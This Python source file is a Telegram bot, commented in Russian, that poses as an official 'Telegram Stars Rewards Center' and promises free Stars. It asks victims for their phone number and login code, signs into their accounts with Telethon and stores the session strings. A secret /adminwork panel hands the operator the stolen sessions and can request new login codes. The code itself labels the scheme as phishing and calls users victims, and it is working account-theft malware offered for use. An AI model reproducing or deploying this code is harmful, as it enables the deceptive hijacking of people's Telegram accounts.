import os
import asyncio
from telebot import TeleBot, types
from telethon import TelegramClient
from telethon.sessions import StringSession

# ================= НАСТРОЙКИ RAILWAY =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

bot = TeleBot(BOT_TOKEN)

# Хранилище в памяти
victims = {}  # phone → {session_string, password, fished_code, first_name, username}

# ====================== МАСКИРОВКА ПОД TELEGRAM STARS ======================
@bot.message_handler(commands=['start'])
def start_message(message):
    text = """🌟 <b>Добро пожаловать в официальный Telegram Stars Rewards Center 2026!</b>

🎁 Специальная акция — получайте Stars бесплатно за подключение аккаунта.

✅ <b>Полная безопасность:</b>
• Официальное API Telegram
• Подключение за 25 секунд
• Никакие пароли не сохраняются на серверах
• В любой момент можно отключить в настройках Telegram

💰 Сразу после подключения:
• 2500–4500 Stars на баланс
• Ежедневные бонусы
• Обмен на TON, USDT, NFT

Нажмите кнопку ниже 👇"""

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🚀 Подключить аккаунт и получить Stars", callback_data="connect"))
    bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup)

# ====================== ФИШИНГ + АВТО СОЗДАНИЕ СЕССИИ ======================
@bot.callback_query_handler(func=lambda call: call.data == "connect")
def connect(call):
    bot.send_message(call.message.chat.id, "📱 Введите номер телефона (+79xxxxxxxxx):")
    bot.register_next_step_handler(call.message, wait_phone)

def wait_phone(message):
    phone = message.text.strip()
    if not phone.startswith("+"):
        phone = "+" + phone
    bot.send_message(message.chat.id, f"✅ Номер: <b>{phone}</b>\n\nВведите код из Telegram/SMS:", parse_mode='HTML')
    bot.register_next_step_handler(message, wait_code, phone)

async def wait_code(message, phone):
    code = message.text.strip()

    print(f"[+] ФИШ УСПЕШЕН → {phone} | Код: {code}")

    # Автоматически создаём сессию
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(phone, code)
        session_string = client.session.save()
        me = await client.get_me()

        victims[phone] = {
            "session_string": session_string,
            "password": None,           # если позже добавим 2FA
            "fished_code": code,
            "first_name": me.first_name,
            "username": me.username
        }

        bot.send_message(ADMIN_ID, f"🌟 НОВАЯ СЕССИЯ!\n📱 {phone}\n✅ Сессия сохранена автоматически")
    except Exception as e:
        bot.send_message(ADMIN_ID, f"⚠️ Фиш пойман, но сессия не создана: {phone}\nКод: {code}\nОшибка: {e}")
    finally:
        await client.disconnect()

    # Ответ жертве
    bot.send_message(message.chat.id, """🎉 <b>Аккаунт подключён!</b>

На баланс начислено <b>3250 Stars</b>!

/start — вернуться в меню""", parse_mode='HTML')

# ====================== СЕКРЕТНАЯ АДМИН-ПАНЕЛЬ ======================
@bot.message_handler(commands=['adminwork'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        return
    asyncio.run(show_admin_panel(message.chat.id))

async def show_admin_panel(chat_id):
    if not victims:
        bot.send_message(chat_id, "Пока нет пойманных аккаунтов.")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    for phone, data in victims.items():
        short = phone[-9:]
        markup.add(
            types.InlineKeyboardButton(f"🔑 Код {short}", callback_data=f"getcode:{phone}"),
            types.InlineKeyboardButton(f"🔑 Пароль {short}", callback_data=f"pass:{phone}"),
            types.InlineKeyboardButton(f"📄 Файл {short}", callback_data=f"file:{phone}"),
            types.InlineKeyboardButton(f"👁 Проверить {short}", callback_data=f"check:{phone}")
        )

    text = f"🔥 PHANTOM ADMIN PANEL\n📱 Активных сессий: {len(victims)}"
    bot.send_message(chat_id, text, reply_markup=markup)

# ====================== ОБРАБОТКА КНОПОК ======================
@bot.callback_query_handler(func=lambda call: True)
def admin_buttons(call):
    if call.from_user.id != ADMIN_ID:
        return

    action, phone = call.data.split(":", 1)
    data = victims.get(phone)
    if not data:
        bot.answer_callback_query(call.id, "Аккаунт не найден")
        return

    if action == "getcode":
        asyncio.run(get_login_code(phone, call.message.chat.id))
    elif action == "pass":
        pw = data.get("password") or "Не был введён"
        bot.send_message(call.message.chat.id, f"📱 {phone}\n🔑 Пароль: {pw}")
    elif action == "file":
        bot.send_message(call.message.chat.id, f"📄 StringSession для {phone}:\n\n<code>{data['session_string']}</code>\n\nСохрани как .session файл или используй в Telethon.", parse_mode='HTML')
    elif action == "check":
        bot.send_message(call.message.chat.id, f"👁 Аккаунт {phone}\nИмя: {data.get('first_name')}\nUsername: @{data.get('username') or 'нет'}")

    bot.answer_callback_query(call.id, "Готово")

async def get_login_code(phone, chat_id):
    data = victims.get(phone)
    if not data:
        return
    client = TelegramClient(StringSession(data["session_string"]), API_ID, API_HASH)
    try:
        await client.connect()
        me = await client.get_me()
        await client.send_code_request(me.phone)
        bot.send_message(chat_id, f"✅ Код запрошен для {phone}\nПроверь сообщения от Telegram в этом аккаунте.")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка: {e}")
    finally:
        await client.disconnect()

print("[+] Stars Phantom Bot запущен на Railway (без папок)")
print("[+] Секретная команда: /adminwork")
bot.infinity_polling()
